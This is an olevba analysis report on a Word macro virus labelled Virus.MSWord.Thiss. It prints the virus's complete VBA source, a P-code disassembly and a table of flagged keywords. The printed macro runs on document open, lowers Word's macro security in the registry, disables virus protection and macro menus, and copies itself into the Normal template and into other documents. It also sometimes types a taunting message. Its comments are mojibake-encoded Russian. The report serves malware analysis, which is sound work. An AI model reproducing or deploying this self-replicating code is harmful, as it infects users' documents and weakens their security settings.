olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thiss
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThissDocument.cls 
in file: Virus.MSWord.Thiss - OLE stream: 'Macros/VBA/ThissDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
' Åñëè òû ÷èòàåøü ýòè ñòðîêè, çíà÷èò òû óæå íåìíîãî øàðèøü
' â ìàêðîñàõ, è ýòî åñòü õîðîøî.  Òû ñïàñèòåëü ìèðà, è òîëüêî
' òû äîëæåí ðàçîáðàòüñÿ êàê îí ðàáîòàåò è óäàëèòü Åãî. Óäà÷è!.
' Ýòîò êîä íàïèñàí â ÷èñòî ïîçíàâàòåëüíûõ öåëÿõ (êîíå÷íî
' îí íåìíîãî ëåâûé, íî ÿ è íå ñîáèðàëñÿ íàïèñàòü êðóòîé âèðóñ
' è âñå ïîõåðèòü, ïðîñòî îí óíè÷òîæàåò  äðóãèå âèðóñû ...)
' Ñ íàèëó÷øèìè ïîæåëàíèÿìè Extremist  :-)
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls(3).Enabled = False
CommandBars("Macro").Controls(4).Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
'CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Set ActDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormTemp = NormalTemplate.VBProject.VBComponents.Item(1)
NTColLn = NormTemp.CodeModule.CountOfLines
ADColLn = ActDoc.CodeModule.CountOfLines
BGN = 2
If ActDoc.Name <> "ThissDocument" Or ADColLn < 4 Then DoAD = True
If NormTemp.Name <> "ThissDocument" Or NTColLn < 4 Then DoNT = True
If DoNT <> True And DoAD <> True Then GoTo NoToInfect
'
If DoNT = True Then
NormTemp.Name = "ThissDocument"
If NTColLn > 0 Then NormTemp.CodeModule.DeleteLines 1, NTColLn
Do While ActDoc.CodeModule.Lines(1, 1) = ""
ActDoc.CodeModule.DeleteLines 1
Loop
NormTemp.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ActDoc.CodeModule.Lines(BGN, 1) <> ""
NormTemp.CodeModule.InsertLines BGN, ActDoc.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
'
If DoAD = True Then
ActDoc.Name = "ThissDocument"
If ADColLn > 0 Then ActDoc.CodeModule.DeleteLines 1, ADColLn
Do While NormTemp.CodeModule.Lines(1, 1) = ""
NormTemp.CodeModule.DeleteLines 1
Loop
ActDoc.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NormTemp.CodeModule.Lines(BGN, 1) <> ""
ActDoc.CodeModule.InsertLines BGN, NormTemp.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
NoToInfect:
'Destruct
If Year(Now) > 2001 And Rnd > 0.95 Then
Selection.EndKey wdStory
Selection.TypeParagraph
Selection.TypeText "Hi LameR": Selection.TypeParagraph
Selection.TypeText "The Extremist has you..": Selection.TypeParagraph
Selection.LanguageID = wdRussian
End If
'
If NTColLn <> 0 And ADColLn = 0 And (InStr(1, ActiveDocument.Name, "Äîêóìåíò") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Äîêóìåíò") = True) Then
ActiveDocument.Saved = True: End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Thiss
' ===============================================================================
' Module streams:
' Macros/VBA/ThissDocument - 5339 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	QuoteRem 0x0000 0x0039 " Åñëè òû ÷èòàåøü ýòè ñòðîêè, çíà÷èò òû óæå íåìíîãî øàðèøü"
' Line #2:
' 	QuoteRem 0x0000 0x003C " â ìàêðîñàõ, è ýòî åñòü õîðîøî.  Òû ñïàñèòåëü ìèðà, è òîëüêî"
' Line #3:
' 	QuoteRem 0x0000 0x003D " òû äîëæåí ðàçîáðàòüñÿ êàê îí ðàáîòàåò è óäàëèòü Åãî. Óäà÷è!."
' Line #4:
' 	QuoteRem 0x0000 0x0037 " Ýòîò êîä íàïèñàí â ÷èñòî ïîçíàâàòåëüíûõ öåëÿõ (êîíå÷íî"
' Line #5:
' 	QuoteRem 0x0000 0x003C " îí íåìíîãî ëåâûé, íî ÿ è íå ñîáèðàëñÿ íàïèñàòü êðóòîé âèðóñ"
' Line #6:
' 	QuoteRem 0x0000 0x0039 " è âñå ïîõåðèòü, ïðîñòî îí óíè÷òîæàåò  äðóãèå âèðóñû ...)"
' Line #7:
' 	QuoteRem 0x0000 0x0028 " Ñ íàèëó÷øèìè ïîæåëàíèÿìè Extremist  :-)"
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #10:
' 	LitVarSpecial (False)
' 	LitDI2 0x0003 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #12:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #13:
' 	ElseBlock 
' Line #14:
' 	QuoteRem 0x0000 0x0036 "CommandBars("Tools").Controls("Macro").Enabled = False"
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ActDoc 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NormTemp 
' Line #19:
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTColLn 
' Line #20:
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADColLn 
' Line #21:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #22:
' 	Ld ActDoc 
' 	MemLd New 
' 	LitStr 0x000D "ThissDocument"
' 	Ne 
' 	Ld ADColLn 
' 	LitDI2 0x0004 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DoAD 
' 	EndIf 
' Line #23:
' 	Ld NormTemp 
' 	MemLd New 
' 	LitStr 0x000D "ThissDocument"
' 	Ne 
' 	Ld NTColLn 
' 	LitDI2 0x0004 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DoNT 
' 	EndIf 
' Line #24:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo NoToInfect 
' 	EndIf 
' Line #25:
' 	QuoteRem 0x0000 0x0000 ""
' Line #26:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LitStr 0x000D "ThissDocument"
' 	Ld NormTemp 
' 	MemSt New 
' Line #28:
' 	Ld NTColLn 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTColLn 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #29:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #31:
' 	Loop 
' Line #32:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #33:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #34:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #35:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #36:
' 	Loop 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	QuoteRem 0x0000 0x0000 ""
' Line #39:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #40:
' 	LitStr 0x000D "ThissDocument"
' 	Ld ActDoc 
' 	MemSt New 
' Line #41:
' 	Ld ADColLn 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADColLn 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #42:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #44:
' 	Loop 
' Line #45:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #47:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #49:
' 	Loop 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Label NoToInfect 
' Line #52:
' 	QuoteRem 0x0000 0x0008 "Destruct"
' Line #53:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D1 
' 	Gt 
' 	Ld Rnd 
' 	LitR8 0x6666 0x6666 0x6666 0x3FEE 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #54:
' 	Ld wdStory 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #56:
' 	LitStr 0x0008 "Hi LameR"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #57:
' 	LitStr 0x0017 "The Extremist has you.."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #58:
' 	Ld wdRussian 
' 	Ld Selection 
' 	MemSt LanguageID 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	QuoteRem 0x0000 0x0000 ""
' Line #61:
' 	Ld NTColLn 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADColLn 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #62:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #63:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	FnInStr3 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #64:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #65:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

